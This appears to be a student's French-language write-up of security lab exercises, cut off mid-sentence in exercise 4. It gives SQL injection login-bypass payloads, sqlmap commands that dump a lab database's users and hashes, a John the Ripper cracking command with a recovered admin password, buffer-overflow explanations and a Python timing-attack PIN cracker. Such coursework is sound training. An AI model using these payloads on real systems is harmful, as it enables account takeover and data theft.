# Exercice 1 :

### Question 1 :

On peut effectuer une injection SQL en commentant le reste de la commande dans la partie de l'email. Après avoir facilement deviné que les mails était 'utilisateur'@myblog.com on peut automatiquement valider le mot de passe : 

    [user@myblog.com'; -- ] 
et n'importe quoi en mot de passe nous connecte sur le user mais aussi : 
    
    [admin@myblog.com'; -- ] 
et n'importe quoi en mot de passe nous connecte sur l'admin :)

### Question 2 :

--data nous permet d'inserer de nouvelles valeurs et donc de se créer un compte : 

    sqlmap -u http://172.19.19.19:8080/level1/login.php --data 'email=corentin&password=vivelasecu'

--dump nous permet en plus de récupérer la totalité de la bdd : 

    sqlmap -u http://172.19.19.19:8080/level1/login.php --data 'email=corentin&password=vivelasecu' --dump

on obtient alors les lignes suivantes : 

    id : 1
    email : admin@myblog.com
    is_admin : 1
    password : $2y$05$RkCmXfp3eLlDJ.ewxSgqv.vtcYKir7Y6UtGjN71Qiz0sSTDumfluu  

    id : 2
    email : user@myblog.com
    is_admin : 0
    password : $2y$05$WYB.xcOknDv4np0ozP2rq.9dInNYJJGPNARJUbdcZv38bAlzva/k.   

on retrouve alors les mots de passes avec 

    john --wordlist=rockyou.txt crack.txt 

en mettant les hash dans le fichier crack.txt , on obtiens notamment "zxcvbnm,./" pour l'admin

# Exercice 2 :

1. Quand on execute ./a.out, cela execute un programme qui attend une entrée. Une fois cette entrée donnée, le programme sort forcément "Try again?". Pour pouvoir changer la variable "modified" qui permet de changer la sortie de ce programme, il faut surcharger le buffer qui demande d'entrer une valeur. Le buffer étant de 64 caractères, il faut donc en entrer plus. La taille max d'un int est de 2147483647, donc d'une longueur de 10. Il faut donc mettre 75 caractères (64 du buffer et 10 de l'int, +1 pour dépasser la limite) afin de surcharger le buffer et la variable "modified", qui prendra donc une valeur différente de 0, ce qui permettra de changer la sortie et d'écrire "you have changed the ’modified’ variable".

# Exercice 3 : 

Voici la fonction "cracker" qui permet de retoruve le MDP en 3 minutes : 


    global password
    import time

    def checkpassword(l):
        for i in range(len(password)):
            time.sleep(1)
            if password[i]!= l[i]:
                return(False)

        return(True)

    password=input("L’ordi va deviner votre code PIN de chiffres entre 0 et 9 de longeur 6 : ")

    def cracker():
        passa=['0','0','0','0','0','0']
        for j in range(6):
            for k in range(9):
                print ('trying : ',''.join(passa))

                start = time.time()
                if(checkpassword(''.join(passa))==True):
                    print('Password is :',''.join(passa))
                    return
                end = time.time()
                print(end - start)
                if(end - start > 2 + j):
                    break
                passa[j]=str(1+int(passa[j]))

    cracker()


# Exercice 4 :

Comme pour l'exercice 2, il faut changer une valeur avec la surcharge du buffer. Mais cette fois il faut trouver une valeur exacte. Nous devons trouver un int égal à 0x61626364. En hexadécimal, cette valeur correspond à abcd. Par conséquent, nous devons rentrer abcd à la fin de la surcharge du buffer. Vu que nous rentrons dans un buffer, c'est donc in